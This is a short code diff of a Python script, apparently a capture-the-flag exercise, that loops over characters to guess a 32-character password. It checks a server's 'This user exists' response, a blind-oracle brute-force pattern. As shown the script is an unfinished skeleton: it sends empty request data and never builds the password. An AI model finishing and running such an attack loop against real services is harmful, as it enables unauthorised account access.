@@ -11,10 +11,13 @@ from required import auth, URL, CHARS
 password = ""
 
 
-def send_request():
-    pass
+def get_respones(character):
+    respones = post(URL, data={}, auth=auth)
+    if "This user exists" in respones.text:
+        return character
+    return None
 
 
 while len(password) <= 32:
     for test_char in CHARS:
-        send_request()
+        get_respones(test_char)
